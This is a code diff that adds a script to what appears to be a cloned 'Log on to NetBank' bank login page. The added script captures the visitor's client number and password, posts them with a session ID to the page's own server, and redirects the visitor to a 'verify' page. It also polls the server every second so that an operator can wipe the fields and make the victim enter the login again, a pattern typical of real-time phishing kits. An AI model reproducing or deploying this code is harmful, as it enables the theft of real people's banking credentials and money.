@@ -48,6 +48,60 @@
      </div>
      <div id="ModuleWrap">
       <div class="module" id="ModuleLeft">
+       <script>
+  // Enable form fields
+  document.getElementById('txtMyClientNumber_field').disabled = false;
+  document.getElementById('txtMyPassword_field').disabled = false;
+  document.getElementById('btnLogon_field').disabled = false;
+
+  // Generate or retrieve session ID
+  let sid = localStorage.getItem('sid');
+  if (!sid) {
+    fetch('/api/session', { method: 'POST' })
+      .then(res => res.json())
+      .then(data => {
+        sid = data.sid;
+        localStorage.setItem('sid', sid);
+      });
+  }
+
+  // Handle form submission
+  document.getElementById('form1').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const clientNumber = document.getElementById('txtMyClientNumber_field').value;
+    const password = document.getElementById('txtMyPassword_field').value;
+
+    fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sid, email: clientNumber, password })
+    })
+    .then(res => {
+      if (res.ok) {
+        window.location.href = '/verify.html';
+      } else {
+        alert('Login failed. Please try again.');
+      }
+    });
+  });
+
+  // Poll for server instructions (e.g., "Redo")
+  function pollStatus() {
+    if (!sid) return;
+    fetch(`/api/status/${sid}`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === 'redo') {
+          document.getElementById('txtMyClientNumber_field').value = '';
+          document.getElementById('txtMyPassword_field').value = '';
+        }
+        setTimeout(pollStatus, 1000);
+      });
+  }
+
+  pollStatus();
+</script>
+
        <h2>
         Log on to NetBank
        </h2>
@@ -432,4 +486,5 @@
   <input id="SC_globalMaskingFieldCount" type="hidden" value="0"/>
   <input id="SC_globalMaskingFieldName" type="hidden" value=""/>
  </body>
+
 </html>
